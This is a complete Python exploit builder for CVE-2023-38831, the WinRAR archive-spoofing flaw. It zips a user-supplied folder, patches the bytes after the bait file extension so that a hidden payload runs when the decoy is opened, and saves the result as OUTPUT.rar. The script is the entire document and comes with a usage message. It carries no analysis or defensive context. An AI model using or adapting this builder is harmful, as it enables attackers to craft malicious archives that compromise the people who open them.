# -*- coding: utf-8 -*-
# @Author  : TongMystic
# @Time    : 9/5/2023 8:17 PM
# @Function:
import os
import shutil
import sys

if __name__ == '__main__':
    if len(sys.argv) > 2:
        filepath = sys.argv[1]
        print(sys.argv[1])
        hideName = sys.argv[2]
    else:
        print("""Help:
              python .\CVE-2023-38831-EXP.py <FilePath> <Hide_Name> """)
        sys.exit()


    shutil.make_archive("TEMPLATE", 'zip', filepath)
    BAIT_EXT = b"." + bytes(hideName.split(".")[-1], "utf-8")  # 获取目标文件名后缀

    with open("TEMPLATE" + ".zip", "rb") as f:
        content = f.read()
        for letter in range(ord('A'), ord('Z') + 1):
            letter_bytes = bytes([letter])
            search_pattern = BAIT_EXT + letter_bytes
            replace_pattern = BAIT_EXT + b" "
            content = content.replace(search_pattern, replace_pattern)


    os.remove("TEMPLATE" + ".zip")

    with open("OUTPUT.rar", "wb") as f:
        f.write(content)


